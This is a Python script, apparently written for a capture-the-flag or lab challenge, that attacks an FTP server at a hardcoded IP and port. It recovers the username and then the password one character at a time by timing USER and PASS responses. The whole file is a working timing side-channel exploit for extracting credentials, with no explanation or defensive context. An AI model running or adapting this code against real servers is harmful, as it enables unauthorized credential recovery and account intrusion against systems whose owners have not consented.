from ftplib import FTP
import sys
import time
import signal

def signal_handler(sig, frame):
    try:
        ftp.close()
    except Exception:
        pass
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

ftp = FTP()
ftp.connect('9.223.189.135', 30019)
# ftp.connect('localhost', 2121)

for _ in range(10):
    try:
        ftp.sendcmd('USER testing123')
    except:
        pass

user_start = time.time()

user = ''
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_'
found = False
while not found:
    total_options = None
    options = [1,2]
    while not found and (total_options is None or len(total_options) > 1):
        options = []
        for c in chars:
            new_user = user + c
            start_time = time.time()
            try:
                resp = ftp.sendcmd('USER ' + new_user)
                if resp[0] == '2' or resp[0] == '3':
                    user = new_user
                    found = True
                    print('Found user', user)
                    break
            except:
                # print('err')
                pass
            end_time = time.time()
            if end_time - start_time >= 0.2 * len(new_user):
                options.append(c)
            # print(c, times[c])
        if total_options is None:
            total_options = list(options)
        for opt in total_options:
            if opt not in options:
                total_options.remove(opt)
        print(f'\toptions: {total_options}')

    if not found:
        max_c = total_options[0]

        user += max_c
        print(f'chose {max_c}')
    
print('user took ', time.time() - user_start)

password_start = time.time()
# now passy time
password = ''
# chars = 'T{}abcdefghijklmnopqrstuvwxyz'
found = False
while not found:
    total_options = None
    options = [1,2]
    while not found and (total_options is None or len(total_options) > 1):
        options = []
        for c in chars:
            new_password = password + c
            start_time = time.time()
            try:
                resp = ftp.sendcmd('PASS ' + new_password)
                if resp[0] == '2' or resp[0] == '3':
                    password = new_password
                    found = True
                    print('Found password', password)
                    break
            except:
                # print('err')
                pass
            end_time = time.time()
            if end_time - start_time >= 0.2 * len(new_password):
                options.append(c)
            # print(c, times[c])
        if total_options is None:
            total_options = list(options)
        for opt in total_options:
            if opt not in options:
                total_options.remove(opt)
        print(f'\toptions: {total_options}')

    if not found:
        max_c = total_options[0]

        password += max_c
        print(f'chose {max_c}')
    